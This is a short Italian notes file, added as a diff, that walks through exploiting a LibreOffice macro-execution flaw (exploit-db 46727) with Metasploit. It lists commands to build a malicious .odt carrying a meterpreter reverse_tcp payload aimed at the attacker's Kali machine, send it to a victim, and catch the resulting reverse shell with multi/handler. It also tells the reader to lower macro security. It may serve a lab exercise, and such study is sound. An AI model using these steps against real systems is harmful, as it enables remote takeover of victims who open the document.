@@ -1,0 +1,25 @@
+#############################################################
+In questo documento sono presenti i comandi per eseguire l'exploit 
+https://www.exploit-db.com/exploits/46727 da Metasploit:
+
+versione di LibreOffice usata: 6.1.1.2
+Abbassare sicurezza macro: Tools -> Options -> Security -> Macro Security -> Low
+#############################################################
+
+> use exploit/multi/fileformat/libreoffice_macro_exec
+> set target 1
+> set payload linux/x86/meterpreter/reverse_tcp
+> set srvhost 192.168.x.x (Kali Address)
+> set lhost 192.168.x.x (Kali Address)
+> exploit
+
+Verrà generato il file .odt malevolo da inviare alla vittima, affichè lo apra.
+
+> use multi/handler
+> set payload linux/x86/meterpreter/reverse_tcp
+> set 192.168.x.x (Kali Address)
+> exploit
+
+Quando la vittima avrà aperto il documento e triggerato lo script con l'evento mouse-over, 
+l'attaccante otterrà una reverse shell della vittima.
+
